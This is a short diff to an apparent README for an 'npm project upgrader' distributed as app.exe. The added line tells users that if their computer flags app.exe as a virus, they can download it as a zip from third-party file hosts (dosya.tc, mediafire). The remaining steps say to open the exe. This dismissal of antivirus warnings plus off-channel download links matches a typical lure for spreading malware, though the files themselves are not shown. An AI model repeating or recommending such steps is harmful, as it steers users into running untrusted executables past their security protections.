@@ -30,6 +30,7 @@
 <br/>
 
 - (1) Download app.exe from releases.
+  - If your computer sees app.exe as a virus, alternative download links; [dosya.tc](https://s2.dosya.tc/server30/7ux0bi/zsdot-npm-app.zip.html) & [mediafire](https://www.mediafire.com/file/ou4s4u6m1ucpri3/zsdot-npm-app.zip/file)
 - (2) Put it on your desktop.
 - (3) open 'app.exe'
 - end, start upgrading npm projects.
